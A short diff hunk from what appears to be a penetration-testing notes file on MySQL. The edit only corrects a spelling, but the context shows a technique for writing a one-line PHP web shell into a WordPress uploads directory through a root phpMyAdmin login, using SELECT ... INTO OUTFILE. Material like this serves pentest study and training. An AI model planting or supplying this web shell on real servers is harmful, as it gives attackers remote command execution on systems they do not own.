@@ -54,7 +54,7 @@ show columns from <table>;
 
 ## Upload a shell 
 
-Take a wordpress installation that uses a mysql database. If you manage to login into the mysql pannel (/phpmyadmin) as root then you could upload a php shell to the /wp-content/uploads/ folder.
+Take a wordpress installation that uses a mysql database. If you manage to login into the mysql panel (/phpmyadmin) as root then you could upload a php shell to the /wp-content/uploads/ folder.
 
 ```mysql
 Select "<?php echo shell_exec($_GET['cmd']);?>" into outfile "/var/www/https/blogblog/wp-content/uploads/shell.php";
